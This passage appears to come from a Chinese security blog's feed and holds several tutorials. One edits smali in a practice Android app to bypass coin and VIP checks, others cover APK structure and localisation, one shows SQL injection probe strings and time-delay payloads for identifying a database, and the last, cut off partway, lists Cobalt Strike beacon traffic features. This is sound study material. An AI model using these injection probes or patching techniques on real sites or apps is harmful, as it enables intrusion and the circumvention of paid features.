zero(a=0)，z即是0的标记，a等于0则跳</td></tr><tr><td style="text-align:left">if-nez</td><td style="text-align:left">全称not equal zero(a!=0)，a不等于0则跳</td></tr><tr><td style="text-align:left">if-ge</td><td style="text-align:left">全称greater equal(a&gt;=b)，a大于或等于则跳</td></tr><tr><td style="text-align:left">if-le</td><td style="text-align:left">全称little equal(a&lt;=b)，a小于或等于则跳</td></tr><tr><td style="text-align:left">goto</td><td style="text-align:left">强制跳到指定位置</td></tr><tr><td style="text-align:left">switch</td><td style="text-align:left">分支跳转，一般会有多个分支线，并根据指令跳转到适当位置</td></tr><tr><td style="text-align:left">iget</td><td style="text-align:left">获取寄存器数据</td></tr></tbody></table><h3 id="寄存器">寄存器</h3><p>在smali中所有的操作都必须经过寄存器来进行：</p><ul><li>v开头数字结尾的寄存器为本地寄存器，如v0、v1、v2等</li><li>p开头数字结尾的寄存器为参数寄存器，如p0、p1、p2等，需要注意的是<ul><li>在非static函数中，p0代指的是<code>this</code>，p1才是第一个参数</li><li>在static函数中，p0是第一个参数</li></ul></li></ul><h2 id="smali代码分析">smali代码分析</h2><p>现在我们看到示例app的第二关，我们长按一键三连发现要求我们充值大会员，现在我们需要找到他的这个判断逻辑代码</p><p>打开jadx，选择apk文件打开，搜索“大会员”作为关键词，如果没有搜索到的话可能需要unicode进行编码再搜索</p><img src="https://image.icewindy.cn/2025/07/8f68f6ec8e5b6da9d017675d12982a46.png" alt="image-20250721202900779" style="zoom: 33%;" /><p>跳转到对应的函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> m36onCreate$lambda2(Ref.IntRef intRef, ChallengeSecond challengeSecond, ImageView imageView, ImageView imageView2, ImageView imageView3, View view) &#123;</span><br><span class="line">        <span class="keyword">if</span> (intRef.element &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            Toast.makeText(challengeSecond, <span class="string">&quot;请先获取10个硬币哦&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (challengeSecond.isvip()) &#123;</span><br><span class="line">            <span class="type">ChallengeSecond</span> <span class="variable">challengeSecond2</span> <span class="operator">=</span> challengeSecond;</span><br><span class="line">            Toast.makeText(challengeSecond2, <span class="string">&quot;当前已经是大会员了哦！&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">            imageView.setImageResource(R.mipmap.zan_active);</span><br><span class="line">            imageView2.setImageResource(R.mipmap.coin_active);</span><br><span class="line">            imageView3.setImageResource(R.mipmap.collect_active);</span><br><span class="line">            SPUtils.INSTANCE.saveInt(challengeSecond2, <span class="string">&quot;level&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Toast.makeText(challengeSecond, <span class="string">&quot;请先充值大会员哦！&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这是jadx反编译后给我们得到的代码，我们要去Smali部分找到对应lambda2函数，我这边找到的是如下代码，并在代码中，我将一行一行注释代码所代表的含义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//私有 静态 不可变的方法</span></span><br><span class="line">.method <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> onCreate$lambda-<span class="number">2</span>(Lkotlin/jvm/internal/Ref$IntRef;Lcom/zj/wuaipojie/ui/ChallengeSecond;Landroid/widget/ImageView;Landroid/widget/ImageView;Landroid/widget/ImageView;Landroid/view/View;)Z<span class="comment">//方法名(传入的参数)返回值布尔类型</span></span><br><span class="line">    .registers <span class="number">7</span> <span class="comment">//寄存器数量为7</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">33</span> <span class="comment">//代码在33行</span></span><br><span class="line">    iget p0, p0, Lkotlin/jvm/internal/Ref$IntRef;-&gt;element:I <span class="comment">//读取第一个参数p0中element的值赋值给p0</span></span><br><span class="line">    <span class="comment">//iget        p0,         p0,         Lkotlin/jvm/internal/Ref$IntRef;-&gt;element:I</span></span><br><span class="line">    <span class="comment">// │          │           │           └─────────────────────────────────────────┘</span></span><br><span class="line">    <span class="comment">// │          │           │                               │</span></span><br><span class="line">    <span class="comment">// 赋值指令   目标寄存器   源对象寄存器            字段引用（类名 + 字段名 + 类型）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    const/<span class="number">4</span> p5, <span class="number">0x1</span> <span class="comment">//给p5赋值1</span></span><br><span class="line"></span><br><span class="line">    const/<span class="number">16</span> v0, <span class="number">0xa</span> <span class="comment">//给v0赋值10，十六进制a代表10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>-ge p0, v0, :cond_15 <span class="comment">//判断p0的值是否大于或等于v0的值，如果为真跳转到:cond15</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">34</span> <span class="comment">//Toast弹窗代码</span></span><br><span class="line">    move-object p0, p1 <span class="comment">//对象引用p1到p0，相当于Object obj1 = obj2;</span></span><br><span class="line"></span><br><span class="line">    check-cast p0, Landroid/content/Context; <span class="comment">//验证p0是否为Context类型</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//               &quot;请先获取10个硬币哦&quot;</span></span><br><span class="line">    const-string v0, <span class="string">&quot;\u8bf7\u5148\u83b7\u53d610\u4e2a\u786c\u5e01\u54e6&quot;</span> <span class="comment">//弹窗文本信息，将&quot;&quot;的内容赋值给v0</span></span><br><span class="line"></span><br><span class="line">    check-cast v0, Ljava/lang/CharSequence; <span class="comment">//验证v0是否是CharSequence类型或它的子类</span></span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;p0, v0, p5&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;</span><br><span class="line"><span class="comment">//调用静态方法，p0是Context引用，v0是显示内容，p5是弹窗显示时间</span></span><br><span class="line"><span class="comment">//Landroid/widget/Toast;-&gt;makeText：Toast类的静态方法makeText的签名</span></span><br><span class="line"><span class="comment">//括号内是方法参数</span></span><br><span class="line"><span class="comment">//Landroid/widget/Toast：返回值为配置好的Toast实例</span></span><br><span class="line"></span><br><span class="line">    move-result-object p0 <span class="comment">//将结果传递给p0</span></span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V <span class="comment">//调用Toast示例p0的show()方法无返回值</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">36</span></span><br><span class="line">    :cond_15 <span class="comment">//跳转到的一个地址</span></span><br><span class="line">    invoke-virtual &#123;p1&#125;, Lcom/zj/wuaipojie/ui/ChallengeSecond;-&gt;isvip()Z <span class="comment">//调用ChallengeSecond示例p1的方法isvip()返回一个布尔值</span></span><br><span class="line"></span><br><span class="line">    move-result p0 <span class="comment">//将结果赋值给p0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>-eqz p0, :cond_43 <span class="comment">//如果p0为0则跳转到:cond_43</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">37</span> <span class="comment">//也是一个Toast弹窗</span></span><br><span class="line">    check-cast p1, Landroid/content/Context;</span><br><span class="line"></span><br><span class="line"><span class="comment">//               &quot;当前已经是大会员了哦！&quot;</span></span><br><span class="line">    const-string p0, <span class="string">&quot;\u5f53\u524d\u5df2\u7ecf\u662f\u5927\u4f1a\u5458\u4e86\u54e6\uff01&quot;</span></span><br><span class="line"></span><br><span class="line">    check-cast p0, Ljava/lang/CharSequence;</span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;p1, p0, p5&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;</span><br><span class="line"></span><br><span class="line">    move-result-object p0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V</span><br><span class="line"></span><br><span class="line">    <span class="comment">//下方38、39、40均为图片资源绑定（将一键三连图标点亮）</span></span><br><span class="line">    const p0, <span class="number">0x7f0d0018</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">38</span></span><br><span class="line">    invoke-virtual &#123;p2, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line">    const p0, <span class="number">0x7f0d0008</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">39</span></span><br><span class="line">    invoke-virtual &#123;p3, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line">    const p0, <span class="number">0x7f0d000a</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">40</span></span><br><span class="line">    invoke-virtual &#123;p4, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">41</span></span><br><span class="line">    sget-object p0, Lcom/zj/wuaipojie/util/SPUtils;-&gt;INSTANCE:Lcom/zj/wuaipojie/util/SPUtils; <span class="comment">//获取静态单例对象SPUtils.INSTANCE存入p0</span></span><br><span class="line"></span><br><span class="line">    const/<span class="number">4</span> p2, <span class="number">0x2</span> <span class="comment">//p2赋值为2</span></span><br><span class="line"></span><br><span class="line">    const-string p3, <span class="string">&quot;level&quot;</span> <span class="comment">//SP索引</span></span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0, p1, p3, p2&#125;, Lcom/zj/wuaipojie/util/SPUtils;-&gt;saveInt(Landroid/content/Context;Ljava/lang/String;I)V <span class="comment">//SP的数据写入</span></span><br><span class="line"></span><br><span class="line">    goto :goto_50 <span class="comment">//跳转到:goto_50</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">44</span> <span class="comment">//Toast弹窗</span></span><br><span class="line">    :cond_43 <span class="comment">//跳转到的地址</span></span><br><span class="line">    check-cast p1, Landroid/content/Context;</span><br><span class="line"></span><br><span class="line"><span class="comment">//               &quot;请先充值大会员哦！&quot;</span></span><br><span class="line">    const-string p0, <span class="string">&quot;\u8bf7\u5148\u5145\u503c\u5927\u4f1a\u5458\u54e6\uff01&quot;</span></span><br><span class="line"></span><br><span class="line">    check-cast p0, Ljava/lang/CharSequence;</span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;p1, p0, p5&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;</span><br><span class="line"></span><br><span class="line">    move-result-object p0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V</span><br><span class="line"></span><br><span class="line">    :goto_50</span><br><span class="line">    <span class="keyword">return</span> p5 <span class="comment">//返回p5，p5为开头赋值的1</span></span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>下面还有<code>isvip()</code>的方法smali代码，实际上这个方法固定返回为否，并不会判断是否为vip</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># virtual methods</span><br><span class="line">.method <span class="keyword">public</span> <span class="keyword">final</span> <span class="title function_">isvip</span><span class="params">()</span>Z</span><br><span class="line">    .registers <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    const/<span class="number">4</span> v0, <span class="number">0x0</span> <span class="comment">//给v0赋值0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v0 <span class="comment">//返回v0</span></span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><h2 id="smali代码修改">smali代码修改</h2><p>修改方法：修改判断、强制跳转、修改寄存器的值</p><img src="https://image.icewindy.cn/2025/07/73e3dff1a9289359c632d33924f00dde.png" style="zoom: 67%;" /><p>我们使用到np管理器，进入<code>classes.dex</code>的编辑，通过搜索功能快速定位到我们要修改的位置</p><h3 id="修改判断">修改判断</h3><p>首先我们要修改硬币数量的判断逻辑，这里我们选择把<code>if-ge</code>大于等于修改为<code>if-le</code>小于等于</p><p><img src="https://image.icewindy.cn/2025/07/1c725fe6b8fa647d3dd8ff0d6a1235f4.png" alt="image-20250721215648861"></p><p>接着我们要修改判断是否为vip部分的逻辑，我们直接将他的判断注释掉即可</p><p><img src="https://image.icewindy.cn/2025/07/b62ec924c427e3d0eba78c6cc58c1751.png" alt="image-20250721215830377"></p><p>保存看一下效果</p><img src="https://image.icewindy.cn/2025/07/39ac637c865d6a0fd1449ccb26cac4f5.png" alt="image-20250721215924059" style="zoom:33%;" /><h3 id="修改寄存器的值">修改寄存器的值</h3><p>一样的，快速定位到需要修改的函数。我们这里首先要把v0的值赋值为0，则v0和p0相比则符合条件</p><p><img src="https://image.icewindy.cn/2025/07/78359c262175d8676ef322e847d28a6c.png" alt="image-20250721220152850"></p><p>接着我们修改isvip()返回的值，跳转到isvip()函数，修改返回值</p><p><img src="https://image.icewindy.cn/2025/07/891aff86ce510182da0d40c151e3f1c9.png" alt="image-20250721220420749"></p><p>修改完成后，保存测试</p><img src="https://image.icewindy.cn/2025/07/7f6c01a3bec15402001125601536cdfb.png" alt="image-20250721220544023" style="zoom:33%;" /><h3 id="抓取按钮id定位">抓取按钮id定位</h3><p>使用开发者工具，定位到按钮，找到View Id(HEX)</p><p><img src="https://image.icewindy.cn/2025/07/0ca08571ff366cd4afbaafaa91b62db2.png" alt="image-20250721220839867"></p><p>搜索选择整数，勾选十六进制即可查找到对应的功能点附近的位置</p><img src="https://image.icewindy.cn/2025/07/b53b21871bbf425d8ff53da65d801edf.png" alt="image-20250721221003040" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 移动安全 </category>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android逆向（1）：APK文件结构、基础修改</title>
      <link href="/2025/07/19/Android%E9%80%86%E5%90%91%EF%BC%881%EF%BC%89%EF%BC%9AAPK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/"/>
      <url>/2025/07/19/Android%E9%80%86%E5%90%91%EF%BC%881%EF%BC%89%EF%BC%9AAPK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="apk文件结构">APK文件结构</h2><p>APK全程Android Package，相当于一个压缩文件。以压缩包的形式打开一个APK可以看到他的结构：</p><img src="https://image.icewindy.cn/2025/07/983bc1d5485ba4cc2ffa86c63047af2a.png" alt="image-20250719215326654" style="zoom:67%;" /><table><thead><tr><th style="text-align:left">文件</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">kotlin</td><td style="text-align:left">使用kotlin编写的Android应用时携带的库</td></tr><tr><td style="text-align:left">META-INF</td><td style="text-align:left">保存应用的签名信息，用于验证应用完整性</td></tr><tr><td style="text-align:left">okhttp3</td><td style="text-align:left">一个依赖包</td></tr><tr><td style="text-align:left">res</td><td style="text-align:left">存放app前端用到的一些图形组件库，一些情况下APP会将证书放在里面的raw目录底下</td></tr><tr><td style="text-align:left">assets</td><td style="text-align:left">存放app的资源文件，通常存放图片之类的静态资源，有时候会存放app的证书，一些仅由HTML5封装的app，其前端代码也会存放在该文件夹下</td></tr><tr><td style="text-align:left">AndroidManifest.xml</td><td style="text-align:left">APK的应用清单，描述了应用的名字、版本、权限、引用的库文件等信息</td></tr><tr><td style="text-align:left">classes.dex</td><td style="text-align:left">java源码编译后的java字节码文件，应用运行的主要逻辑</td></tr><tr><td style="text-align:left">resources.arsc</td><td style="text-align:left">编译后的二进制资源文件，为一个映射表</td></tr></tbody></table><h2 id="汉化">汉化</h2><p>流程图</p><img src="https://image.icewindy.cn/2025/07/f6ae457edfba43acb15133c874889da5.png" alt="image.png" style="zoom:50%;" /><p>现在我们的示例app里面有一个需要我们汉化的地方</p><img src="https://image.icewindy.cn/2025/07/c3b465ddc5aa3b6c2ba3395ea9126074.png" alt="image.png" style="zoom: 33%;" /><p>现在我们用第一种方法：我们使用NP管理器，打开APK，搜索hello</p><img src="https://image.icewindy.cn/2025/07/4522538a142b85d07c76083f3d069f3b.png" alt="image.png" style="zoom: 50%;" /><p>通过这种方式我们可以找到我们需要修改的地方</p><img src="https://image.icewindy.cn/2025/07/b6400f163e861bc5fe138e3191291eee.png" alt="image.png" style="zoom:50%;" /><p>直接进行修改成“你好，吾爱破解”，然后保存并安装即可。</p><p>第二种方法适用于我们需要定位再复制内容的情况，例如上面俄文的部分，我们可以通过开发者助手这个app进行定位布局，并且复制再进行修改</p><img src="https://image.icewindy.cn/2025/07/1d81292f2847fc7057fe48596777bf48.png" alt="image-20250720184433576" style="zoom: 33%;" /><p>我们通过第一种方法同样的操作后我们发现了这个语句被放在了<code>resources.arsc</code>文件内，通过np管理器的翻译功能我们可以进入到他的编辑页面，选择DEFAULT，找到对应的语句我们就可以进行修改了</p><img src="https://image.icewindy.cn/2025/07/aaa19b85622f07b2ad230171bcc2299e.png" alt="image-20250720185151008" style="zoom:50%;" /><p>然后我们app内还有最后一个，最后一句是硬编码存放在<code>classes.dex</code>，我们用Dex编辑进入，搜索对应的字符串</p><img src="https://image.icewindy.cn/2025/07/6a25e515a8cabd82aaf0023a1e5d140e.png" alt="image-20250720185530758" style="zoom:50%;" /><img src="https://image.icewindy.cn/2025/07/c027c1229963f28c8a6f31ca8126f79a.png" alt="image-20250720185715156" style="zoom:50%;" /><p>保存，并让np管理器进行签名即可完成修改汉化。</p><img src="https://image.icewindy.cn/2025/07/9f09f964bb4fdff04f6b002d63bb8164.png" alt="image-20250720185841054" style="zoom: 33%;" /><h2 id="androidmanifest-xml">AndroidManifest.xml</h2><p>AndroidManifest.xml文件是整个应用程序的信息描述文件，定义了应用程序中包含的<code>Activity</code>、<code>Service</code>、<code>Content provider</code>、<code>BroadcastReceiver</code>组件信息。</p><p>它描述了package中暴露的组件和他们的实现类，还有各种能被处理的数据和启动位置。</p><p>几个比较常见的属性</p><table><thead><tr><th>属性</th><th>定义</th></tr></thead><tbody><tr><td>versionCode</td><td>版本号</td></tr><tr><td>versionName</td><td>版本名</td></tr><tr><td>package</td><td>包名</td></tr><tr><td>uses-permission android:name=&quot;&quot;</td><td>应用权限</td></tr><tr><td>android:label=&quot;@string/app_name&quot;</td><td>APP名称</td></tr><tr><td>android:icon=&quot;@mipmap/ic_launcher&quot;</td><td>APP图标位置</td></tr><tr><td>android:debuggable=“true”</td><td>是否开启DEBUG权限</td></tr></tbody></table><p>通过反编译后编辑他的属性的值再签名打包，我们可以做到删除某些权限，或者修改他的名称图标之类的，当然对签名验证的APP直接采用这种方式不太可行。</p><p>反编译后的AndroidManifest.xml如下</p><img src="https://image.icewindy.cn/2025/07/58730a6d000cb6d874f6dea20a534bc1.png" alt="image-20250720205028011" style="zoom: 33%;" /><p>我们来尝试修改应用名字和图标，直接可以使用NP管理器的功能，里面有<code>通用编辑功能</code>，我们可以通过这种方式修改</p><img src="https://image.icewindy.cn/2025/07/94ba65e2542223abb7ad70c37af4e0aa.png" alt="image-20250720205153614" style="zoom:50%;" /><h2 id="课后作业">课后作业</h2><p>这个课程还有一个课后作业，第一个是自己尝试双开，第二个是替换图片。第一个就懒得做了，直接做第二个，在res文件夹里面找到图片替换即可</p><p><img src="https://image.icewindy.cn/2025/07/bd46d63e2d2fc09653c608fd2fc0e173.png" alt="image-20250720210510149"></p><p>不知道有没有其他法子，目前只会这种（</p>]]></content>
      
      
      <categories>
          
          <category> 移动安全 </category>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入判断数据库类型</title>
      <link href="/2025/07/18/SQL%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B/"/>
      <url>/2025/07/18/SQL%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="基于报错信息判断">基于报错信息判断</h2><p>如果注入点对报错信息直接进行返回的话，我们可以通过他返回的报错信息判断得到数据库的类型，以下为不完全列举，具体可以直接把报错语句丢到搜索引擎或AI查询</p><h3 id="mysql错误信息">MySQL错误信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near...</span><br></pre></td></tr></table></figure><h3 id="sql-server错误信息">SQL Server错误信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Incorrect syntax near...</span><br><span class="line">或</span><br><span class="line">Unclosed quotation mark after the character string...</span><br></pre></td></tr></table></figure><p>还会出现类似于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">错误[42000]：在应使用条件的上下文(在&#x27;iamasb&#x27;附近)中指定了非布尔类型的表达式</span><br></pre></td></tr></table></figure><h3 id="oracle错误信息">Oracle错误信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORA-00933: SQL command not properly ended</span><br></pre></td></tr></table></figure><h3 id="postgresql错误信息">PostgreSQL错误信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR: syntax error at or near...</span><br></pre></td></tr></table></figure><h2 id="基于默认端口判断">基于默认端口判断</h2><p>这个一般不太实用，数据库一般不会开放端口给外网。</p><ul><li>MySQL：3306</li><li>SQL Server：1443</li><li>Oracle：1251</li><li>PostgreSQL：5432、5433</li></ul><h2 id="基于特定函数判断">基于特定函数判断</h2><h3 id="len-length">len() / length()</h3><ul><li>len()：SQL Server、MySQL、DB2采用该函数返回长度值</li><li>length()：oracle、INFORMIX采用该函数返回长度值</li></ul><h3 id="version-version">@@version / version()</h3><p>MySQL两种都可以返回当前版本信息。SQL Server则仅能通过<code>@@version</code>返回版本信息，使用<code>version()</code>时会出现报错。</p><h3 id="xor逻辑运算符">xor逻辑运算符</h3><p>xor 是一个逻辑运算符，用于返回两个布尔表达式的异或结果。</p><p>SQL Server没有直接的xor运算符。</p><h3 id="if函数">IF函数</h3><p>SQL Server仅有IIF函数（<code>IIF(condition, value_if_true, value_if_false)</code>）和<code>CASE WHEN</code>表达式（<code>CASE WHEN condition THEN value1 ELSE value2 END</code>），并无IF函数。</p><p>MySQl有IF函数（<code>IF(condition, value_if_true, value_if_false)</code>）。</p><h3 id="substring-substr">substring / substr</h3><p>MySQL和SQL Server两个函数都可以调用。</p><p>Oracle仅可以使用<code>substr</code>。</p><h2 id="基于注释符号判断">基于注释符号判断</h2><p>首先是不同数据库的注释符号不同：</p><ul><li>MySQL：<code>--</code>、<code>#</code>、<code>/* */</code></li><li>SQL Server：<code>--</code>、<code>/* */</code></li><li>Oracle：<code>--</code>、<code>/* */</code></li><li>PostgreSQL：<code>--</code>、<code>/* */</code></li></ul><p>因此通过是否使用#作为注释，可以排查出是否为MySQL数据库。</p><h2 id="基于字符串连接符判断">基于字符串连接符判断</h2><ul><li><p>Oracle/PostgreSQL：<code>||</code></p><figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; || &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27;--  -- 若返回正常，可能是Oracle/PG</span></span><br></pre></td></tr></table></figure></li><li><p>SQL Server：<code>+</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;a&#x27;+&#x27;b&#x27;--       -- 若返回&#x27;ab&#x27;，则是SQL Server</span><br></pre></td></tr></table></figure></li><li><p>MySQL：<code> </code>（空格）或 <code>CONCAT()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;a&#x27; &#x27;b&#x27;         -- 返回&#x27;ab&#x27;则可能是MySQL</span><br></pre></td></tr></table></figure></li></ul><h2 id="基于时间延迟函数判断">基于时间延迟函数判断</h2><ul><li>MySQL：<code>SLEEP(5)</code></li><li>PostgreSQL：<code>PG_SLEEP(5)</code></li><li>SQL Server：<code>WAITFOR DELAY '0:0:5'</code></li><li>Oracle：<code>DBMS_LOCK.SLEEP(5)</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike流量特征</title>
      <link href="/2025/06/01/CobaltStrike%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81/"/>
      <url>/2025/06/01/CobaltStrike%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81/</url>
      
        <content type="html"><![CDATA[<p>原文与图片来源：<a href="https://www.ddosi.org/cobaltstrike/">https://www.ddosi.org/cobaltstrike/</a></p><h2 id="基础特征-修改profile-证书可隐藏">基础特征（修改profile/证书可隐藏）</h2><h3 id="http请求">http请求</h3><p>http-beacon通信中，在默认profile文件的情况下，会使用get方法向<code>/ca /dpixel /__utm.gif</code>等地址发起请求，同时会存在cookie字段、其值为base64编码后的非对称算法加密数据。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># default c2-http profile</span><br><span class="line"># define indicators for an HTTP GET</span><br><span class="line">http-get <span class="punctuation">&#123;</span></span><br><span class="line">    # Beacon will randomly choose from this pool of URIs</span><br><span class="line">    set uri <span class="string">&quot;/ca /dpixel /__utm.gif /pixel.gif /g.pixel /dot.gif /updates.rss /fwlink /cm 